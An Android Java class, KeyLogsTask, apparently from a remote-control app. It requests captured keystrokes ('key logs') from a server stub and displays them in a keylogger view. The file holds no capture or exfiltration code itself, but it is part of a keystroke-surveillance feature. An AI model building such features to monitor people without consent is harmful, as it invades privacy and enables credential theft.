package pl.jacekpiszczek.androidapp.tasks.more;

import android.support.design.widget.Snackbar;
import android.support.v7.app.AppCompatActivity;
import android.widget.TextView;
import pl.jacekpiszczek.androidapp.Command;
import pl.jacekpiszczek.androidapp.Empty;
import pl.jacekpiszczek.androidapp.R;
import pl.jacekpiszczek.androidapp.elements.DataManager;
import pl.jacekpiszczek.androidapp.elements.Tasker;

import java.util.concurrent.TimeUnit;

public class KeyLogsTask implements Tasker {
    @Override
    public void doTask(AppCompatActivity activity, Object[] params) {
        Command response = DataManager.getInstance().getStub()
                .withDeadlineAfter(3, TimeUnit.SECONDS)
                .getKeyLogs(Empty.getDefaultInstance());
        TextView keyText = activity.findViewById(R.id.text_keylogger_keys);

        String keys = response.getParam();

        activity.runOnUiThread(() -> keyText.setText(keys));

    }

    @Override
    public void doWhenError(AppCompatActivity activity, Object[] params) {
        Snackbar.make(activity.findViewById(R.id.text_keylogger_keys), R.string.connection_error, Snackbar.LENGTH_LONG).show();
    }
}
